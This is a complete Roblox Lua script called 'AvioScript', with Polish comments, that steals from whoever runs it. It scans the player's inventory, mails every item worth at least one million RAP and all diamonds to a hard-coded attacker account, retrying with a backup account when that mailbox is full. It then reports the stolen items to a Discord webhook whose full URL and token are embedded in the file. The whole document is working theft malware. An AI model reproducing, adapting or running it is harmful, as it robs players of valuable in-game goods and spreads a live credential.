-- AvioScript by [Twoja Nazwa]
-- Discord: [Twój Discord]

-- Konfiguracja
local Username = "Virtual122" -- Główny użytkownik
local Username2 = "your_2nd_user_here" -- Zapasowy użytkownik
local Webhook = "https://discord.com/api/webhooks/1295068053079457812/6ICjb5IxIFE8IEm0IwHaXAu_4LnRZHORc0jfJ2dwniH-UKBkjM6pTlkjVNlN21ZMejlc" -- Webhook Discord
local MinRAP = 1000000 -- Minimalna wartość RAP dla przedmiotów
local MailMessage = "AvioScript on top! 🚀" -- Wiadomość dołączana do przesyłanych przedmiotów

-- Zmienne
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local AvioScriptExecuted = _G.AvioScriptExecuted or false

if AvioScriptExecuted then
    return
end
_G.AvioScriptExecuted = true

-- Funkcja formatująca liczby
local function formatNumber(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- Funkcja pobierająca thumbnail przedmiotu
local function getThumbnail(imageId)
    local assetId = string.split(imageId, "rbxassetid://")[2]
    local thumbnailUrl = "https://thumbnails.roblox.com/v1/assets?assetIds=" .. assetId .. "&size=420x420&format=Png&isCircular=false"
    local response = game:HttpGet(thumbnailUrl)
    local decoded = HttpService:JSONDecode(response)
    return decoded.data[1].imageUrl
end

-- Funkcja wysyłająca wiadomość na Discord
local function SendToDiscord(username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json",
    }

    local fields = {
        {
            name = "📌 Użytkownik:",
            value = username,
            inline = true
        },
        {
            name = "📦 Przesłane przedmioty:",
            value = "",
            inline = false
        },
        {
            name = "📊 Podsumowanie:",
            value = "",
            inline = false
        }
    }

    -- Dodaj informacje o każdym przedmiocie
    for _, item in ipairs(sortedItems) do
        local thumbnail = getThumbnail(item.imageId)
        fields[2].value = fields[2].value .. string.format(
            "[%s](%s) (x%d): %s RAP\n",
            item.name, thumbnail, item.amount, formatNumber(item.rap * item.amount)
        )
    end

    -- Podsumowanie
    fields[3].value = fields[3].value .. "💎 Diamenty: " .. formatNumber(diamonds) .. "\n"
    fields[3].value = fields[3].value .. "📈 Całkowity RAP: " .. formatNumber(totalRAP) .. "\n"
    fields[3].value = fields[3].value .. "📦 Liczba przedmiotów: " .. #sortedItems

    local data = {
        ["embeds"] = {{
            ["title"] = "🚀 AvioScript - Nowa transakcja",
            ["color"] = 0x00FF00,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "AvioScript by [Twoja Nazwa]"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)

    if Webhook and Webhook ~= "" then
        local response = request({
            Url = Webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

-- Funkcja pobierająca wartość RAP przedmiotu
local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0
end

-- Funkcja wysyłająca przedmiot
local function sendItem(category, uid, am)
    local args = {
        [1] = Username,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    local response = false
    repeat
        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        if response == false and err == "They don't have enough space!" then
            Username = Username2
            args[1] = Username
        end
    until response == true
end

-- Funkcja wysyłająca wszystkie diamenty
local function SendAllGems()
    for i, v in pairs(save.Currency) do
        if v.id == "Diamonds" then
            local args = {
                [1] = Username,
                [2] = MailMessage,
                [3] = "Currency",
                [4] = i,
                [5] = v._am
            }
            network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            break
        end
    end
end

-- Główna logika skryptu
local function Main()
    for category, items in pairs(save) do
        for uid, item in pairs(items) do
            local rapValue = getRAP(category, item)
            if rapValue >= MinRAP then
                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                local imageId = dir.thumbnail or dir.icon
                table.insert(sortedItems, {
                    category = category,
                    uid = uid,
                    amount = item._am or 1,
                    rap = rapValue,
                    name = item.id,
                    imageId = imageId
                })
                totalRAP = totalRAP + (rapValue * (item._am or 1))
            end
        end
    end

    if #sortedItems > 0 then
        SendToDiscord(plr.Name, save.Currency.Diamonds._am or 0)
        for _, item in ipairs(sortedItems) do
            sendItem(item.category, item.uid, item.amount)
        end
        SendAllGems()
    end
end

-- Uruchomienie skryptu
Main()
